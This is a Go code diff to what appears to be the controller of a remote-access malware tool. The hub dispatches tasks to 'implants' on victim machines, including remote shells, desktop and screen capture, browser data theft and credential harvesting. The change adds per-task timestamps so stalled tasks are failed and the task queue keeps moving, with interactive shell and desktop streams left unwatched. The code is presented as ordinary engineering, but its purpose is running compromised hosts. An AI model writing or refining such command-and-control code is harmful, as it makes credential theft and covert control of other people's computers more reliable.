@@ -92,6 +92,11 @@ type Task struct {
 	Done      bool
 	Err       string
 	Off       int64
+	// Started is when the task was handed to the implant, Seen is the last time
+	// a frame arrived for it. Heartbeats keep the *session* alive, so session
+	// silence cannot tell whether a task is stuck; these two can.
+	Started time.Time
+	Seen    time.Time
 }
 
 type EventKind string
@@ -237,16 +242,25 @@ func (h *Hub) Tick() {
 			deadAfter = 90 * time.Second
 		}
 		// A task that has gone quiet holds the only task slot on this session.
-		// Fail it so the queue can move instead of stalling until purgeAfter.
+		// Fail it so the queue can move instead of stalling forever. The clock
+		// is the task's own silence: heartbeats keep the session fresh even when
+		// the implant silently ignores the command.
 		if s.Busy {
-			if t := h.inFlightLocked(s); t != nil && !t.Done && age >= stallFor(t.Kind) {
-				t.Done = true
-				t.Err = fmt.Sprintf("implant 无响应（%s 无数据），任务已中止；该指令可能不被此植入端支持",
-					stallFor(t.Kind))
-				s.Busy = false
-				s.currentID = ""
-				h.emitLocked(Event{Kind: EventTaskError, SessionID: id, TaskID: t.ID, Error: t.Err})
-				h.kickLocked(s)
+			if t := h.inFlightLocked(s); t != nil && !t.Done {
+				if budget, watched := stallFor(t.Kind); watched {
+					since := t.Seen
+					if since.IsZero() {
+						since = t.Started
+					}
+					if idle := now.Sub(since); idle >= budget {
+						t.Done = true
+						t.Err = fmt.Sprintf("implant 无响应（%s 无数据），任务已中止；该指令可能不被此植入端支持", budget)
+						s.Busy = false
+						s.currentID = ""
+						h.emitLocked(Event{Kind: EventTaskError, SessionID: id, TaskID: t.ID, Error: t.Err})
+						h.kickLocked(s)
+					}
+				}
 			}
 		}
 
@@ -350,13 +364,17 @@ func putSend(send func(protocol.Type, []byte) error, path string, data []byte, o
 	_ = send(protocol.CmdFsPut, []byte{2})
 }
 
-// stallFor picks the silence budget for a task kind.
-func stallFor(kind TaskKind) time.Duration {
+// stallFor picks the silence budget for a task kind. Streaming kinds (an open
+// shell, a desktop feed) are meant to stay quiet for a long time and are not
+// watched at all.
+func stallFor(kind TaskKind) (time.Duration, bool) {
 	switch kind {
+	case TaskShell, TaskDesktop:
+		return 0, false
 	case TaskBrowser, TaskBrowserDeep, TaskCreds:
-		return stallBatch
+		return stallBatch, true
 	default:
-		return stallTask
+		return stallTask, true
 	}
 }
 
@@ -368,6 +386,9 @@ func (h *Hub) kickLocked(s *Session) {
 	s.queue = s.queue[1:]
 	s.Busy = true
 	s.currentID = q.task.ID
+	now := h.now()
+	q.task.Started = now
+	q.task.Seen = now
 	if q.task.Kind == TaskFsPut {
 		off := int64(0)
 		if len(q.task.Payload) >= 8 {
@@ -602,10 +623,16 @@ func (h *Hub) OnFrame(sessionID string, f protocol.Frame) {
 			h.emitLocked(Event{Kind: EventSessionUp, SessionID: sessionID})
 		}
 	case protocol.RspShell:
+		if t := h.inFlightLocked(s); t != nil {
+			t.Seen = h.now()
+		}
 		h.emitLocked(Event{Kind: EventShellData, SessionID: sessionID, Data: decodeOEM(f.Payload)})
 	case protocol.RspFrame:
 		b64 := base64.StdEncoding.EncodeToString(f.Payload)
 		t := h.inFlightLocked(s)
+		if t != nil {
+			t.Seen = h.now()
+		}
 		if t != nil && t.Kind == TaskScreen {
 			t.Output = append([]byte(nil), f.Payload...)
 			h.emitLocked(Event{Kind: EventScreenFrame, SessionID: sessionID, TaskID: t.ID, Data: b64, Encoding: "base64", Mime: "image/jpeg"})
@@ -617,6 +644,7 @@ func (h *Hub) OnFrame(sessionID string, f protocol.Frame) {
 		if t == nil {
 			return
 		}
+		t.Seen = h.now() // progress: keeps transfers and long commands off the stall guard
 		switch t.Kind {
 		case TaskDesktop:
 			t.Output = append([]byte(nil), f.Payload...)
